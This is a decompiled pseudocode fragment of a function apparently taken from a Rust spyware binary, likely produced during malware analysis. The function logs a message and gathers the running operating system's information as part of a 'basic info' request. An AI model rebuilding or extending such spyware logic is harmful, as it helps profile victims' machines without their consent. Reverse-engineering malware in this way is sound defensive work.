__int64 __fastcall spyware::actions::basic_info::get_basic_info_request(__int64 a1)
{
  _QWORD v2[5]; // [rsp+8h] [rbp-60h] BYREF
  _QWORD v3[3]; // [rsp+30h] [rbp-38h] BYREF
  __int128 v4; // [rsp+48h] [rbp-20h]

  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )
  {
    v3[0] = &off_B97E8;
    v3[1] = 1LL;
    v3[2] = 8LL;
    v4 = 0LL;
    v2[0] = aSpywareActions;
    v2[1] = 28LL;
    v2[2] = aSpywareActions;
    v2[3] = 28LL;
    v2[4] = log::__private_api::loc(&off_B97F8);
    log::__private_api::log(v3, 4LL, v2);
  }
  spyware::actions::basic_info::get_running_os_info(a1);
  *(_DWORD *)(a1 + 56) = 1;
  *(_BYTE *)(a1 + 62) = 1;
  *(_WORD *)(a1 + 60) = 257;
  *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;
  return a1;
}